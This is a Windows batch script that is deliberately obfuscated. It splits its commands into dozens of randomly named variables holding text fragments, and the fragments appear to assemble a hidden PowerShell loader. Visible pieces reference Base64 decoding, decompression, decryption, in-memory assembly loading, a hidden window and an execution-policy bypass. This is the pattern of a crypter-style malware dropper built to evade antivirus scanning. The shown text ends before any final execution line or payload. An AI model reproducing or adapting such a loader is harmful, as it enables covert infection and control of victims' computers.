@echo off
%felTzFcKkvcIMnWpEwFH%s%felTzFcKkvcIMnWpEwFH%e%felTzFcKkvcIMnWpEwFH%t%felTzFcKkvcIMnWpEwFH%l%felTzFcKkvcIMnWpEwFH%o%felTzFcKkvcIMnWpEwFH%c%felTzFcKkvcIMnWpEwFH%a%felTzFcKkvcIMnWpEwFH%l%felTzFcKkvcIMnWpEwFH% %felTzFcKkvcIMnWpEwFH%e%felTzFcKkvcIMnWpEwFH%n%felTzFcKkvcIMnWpEwFH%a%felTzFcKkvcIMnWpEwFH%b%felTzFcKkvcIMnWpEwFH%l%felTzFcKkvcIMnWpEwFH%e%felTzFcKkvcIMnWpEwFH%d%felTzFcKkvcIMnWpEwFH%e%felTzFcKkvcIMnWpEwFH%l%felTzFcKkvcIMnWpEwFH%a%felTzFcKkvcIMnWpEwFH%y%felTzFcKkvcIMnWpEwFH%e%felTzFcKkvcIMnWpEwFH%d%felTzFcKkvcIMnWpEwFH%e%felTzFcKkvcIMnWpEwFH%x%felTzFcKkvcIMnWpEwFH%p%felTzFcKkvcIMnWpEwFH%a%felTzFcKkvcIMnWpEwFH%n%felTzFcKkvcIMnWpEwFH%s%felTzFcKkvcIMnWpEwFH%i%felTzFcKkvcIMnWpEwFH%o%felTzFcKkvcIMnWpEwFH%n%felTzFcKkvcIMnWpEwFH%
set "DCjIkXoCEvXCSKmrSvTu=s"
set "FoYNcDQBMaxvGEYuuCOp=t"
set "YUIHJZALwOHQtSKjodAY=!DCjIkXoCEvXCSKmrSvTu!e!FoYNcDQBMaxvGEYuuCOp!"
!YUIHJZALwOHQtSKjodAY! "YCVLKCgYIP=8=')"
!YUIHJZALwOHQtSKjodAY! "hGLEDFTJsq=();	"
!YUIHJZALwOHQtSKjodAY! "rztBXPWgdL=deco"
!YUIHJZALwOHQtSKjodAY! "mzzRXAXZYk=se()"
!YUIHJZALwOHQtSKjodAY! "GXBTGMOhYi==New"
!YUIHJZALwOHQtSKjodAY! "LgDXmnxebL=morF"
!YUIHJZALwOHQtSKjodAY! "UAiRdNgaui=wTit"
!YUIHJZALwOHQtSKjodAY! "jHFUwuaDUZ=ispo"
!YUIHJZALwOHQtSKjodAY! "lmpSdmwhHf=aeR'"
!YUIHJZALwOHQtSKjodAY! "cYktVvxTDS=');	"
!YUIHJZALwOHQtSKjodAY! "jjlDuhGFPf=w-Ob"
!YUIHJZALwOHQtSKjodAY! "hgLmzkIIHU=Conv"
!YUIHJZALwOHQtSKjodAY! "WqDufcZPEs=exec"
!YUIHJZALwOHQtSKjodAY! "ZLFujwuUlc=.Ass"
!YUIHJZALwOHQtSKjodAY! "CgdESlYVrY=ose("
!YUIHJZALwOHQtSKjodAY! "GJkySDaYoJ=tsWi"
!YUIHJZALwOHQtSKjodAY! "KohmasKvdx=('\'"
!YUIHJZALwOHQtSKjodAY! "NfTYswIpiS=ert]"
!YUIHJZALwOHQtSKjodAY! "ICNosbYZtX=flec"
!YUIHJZALwOHQtSKjodAY! "OrLlfqfroc='[-1"
!YUIHJZALwOHQtSKjodAY! "AeXOVtKRbt=, [I"
!YUIHJZALwOHQtSKjodAY! "SHsNnkOiOt=t]::"
!YUIHJZALwOHQtSKjodAY! "COqabwwHhT=Stre"
!YUIHJZALwOHQtSKjodAY! "OsDMYuwZDO=ss);"
!YUIHJZALwOHQtSKjodAY! "HFkIEOtnHM=_fun"
!YUIHJZALwOHQtSKjodAY! "fZhNNpnWGx=yloa"
!YUIHJZALwOHQtSKjodAY! "WwpujpLsgS=ing="
!YUIHJZALwOHQtSKjodAY! "LNFiFpTxle=ose("
!YUIHJZALwOHQtSKjodAY! "YaAooOZTDA=trin"
!YUIHJZALwOHQtSKjodAY! "kQQeNLqJfz=t.UI"
!YUIHJZALwOHQtSKjodAY! "CnIqPlPrfF=unct"
!YUIHJZALwOHQtSKjodAY! "MGFmFSoIYM=Conv"
!YUIHJZALwOHQtSKjodAY! "usxtduXliT=e();"
!YUIHJZALwOHQtSKjodAY! "WfMplYvSUr=.-16"
!YUIHJZALwOHQtSKjodAY! "UzYfFXyGDH=ncti"
!YUIHJZALwOHQtSKjodAY! "oDQifJtRKl=nkk."
!YUIHJZALwOHQtSKjodAY! "RglNRRkBlg=oryS"
!YUIHJZALwOHQtSKjodAY! "mfWJscBJfb=ryPo"
!YUIHJZALwOHQtSKjodAY! "MaPmiuTUCm=Padd"
!YUIHJZALwOHQtSKjodAY! "CbjsrzWTMf=ity."
!YUIHJZALwOHQtSKjodAY! "NBunxrPPbi=ep b"
!YUIHJZALwOHQtSKjodAY! "kJaBOUPqxI=m.Re"
!YUIHJZALwOHQtSKjodAY! "nJSzkRuPlU=func"
!YUIHJZALwOHQtSKjodAY! "wldlnBwvaq=($pa"
!YUIHJZALwOHQtSKjodAY! "eSTpuOvpXI=0oII"
!YUIHJZALwOHQtSKjodAY! "NDyCSJiHea=::('"
!YUIHJZALwOHQtSKjodAY! "mrvZdYeeHH=r_va"
!YUIHJZALwOHQtSKjodAY! "cFHIjxzObi=reak"
!YUIHJZALwOHQtSKjodAY! "daVJunnmUi=n (["
!YUIHJZALwOHQtSKjodAY! "PPYEscrSZL=Obje"
!YUIHJZALwOHQtSKjodAY! "CaMJOFMeds=Disp"
!YUIHJZALwOHQtSKjodAY! "NCBAtNxooo=('XU"
!YUIHJZALwOHQtSKjodAY! "NBQpRfGdHA=tor_"
!YUIHJZALwOHQtSKjodAY! "ajaoppHyXE=GHB."
!YUIHJZALwOHQtSKjodAY! "WlyKlwKkci=ram2"
!YUIHJZALwOHQtSKjodAY! "rExtIXWsfW=('da"
!YUIHJZALwOHQtSKjodAY! "myihfZwzGj=yle "
!YUIHJZALwOHQtSKjodAY! "zvcPmqknfO=ne);"
!YUIHJZALwOHQtSKjodAY! "UUWfKNlkvh=mory"
!YUIHJZALwOHQtSKjodAY! "TexNYeXqjj=ox.D"
!YUIHJZALwOHQtSKjodAY! "ysaSPQFyiy=_var"
!YUIHJZALwOHQtSKjodAY! "qgxmaQWuBi=V=[S"
!YUIHJZALwOHQtSKjodAY! "MJBWttwRsl=join"
!YUIHJZALwOHQtSKjodAY! "kgEOxORyzp=ess_"
!YUIHJZALwOHQtSKjodAY! "fvvZWcniMI=N=[S"
!YUIHJZALwOHQtSKjodAY! "GZvkVmiUNp=fore"
!YUIHJZALwOHQtSKjodAY! "FbikMEVxga=;	$X"
!YUIHJZALwOHQtSKjodAY! "HeNqKMskCj=oL'["
!YUIHJZALwOHQtSKjodAY! "nDePIbrFAv=saBm"
!YUIHJZALwOHQtSKjodAY! "EvRTrraANI=indo"
!YUIHJZALwOHQtSKjodAY! "SwHfnuKxtx=m($C"
!YUIHJZALwOHQtSKjodAY! "PvPEHLjrhT=ram_"
!YUIHJZALwOHQtSKjodAY! "jgjplafuNJ=tem."
!YUIHJZALwOHQtSKjodAY! "JIavpCNses=fO.S"
!YUIHJZALwOHQtSKjodAY! "rshRDlaaxZ=join"
!YUIHJZALwOHQtSKjodAY! "DBNYQAnuES=] -j"
!YUIHJZALwOHQtSKjodAY! "crqLJPfUiX=cryp"
!YUIHJZALwOHQtSKjodAY! "aoYInDhieb=::('"
!YUIHJZALwOHQtSKjodAY! "WPbLefjVqA=ypas"
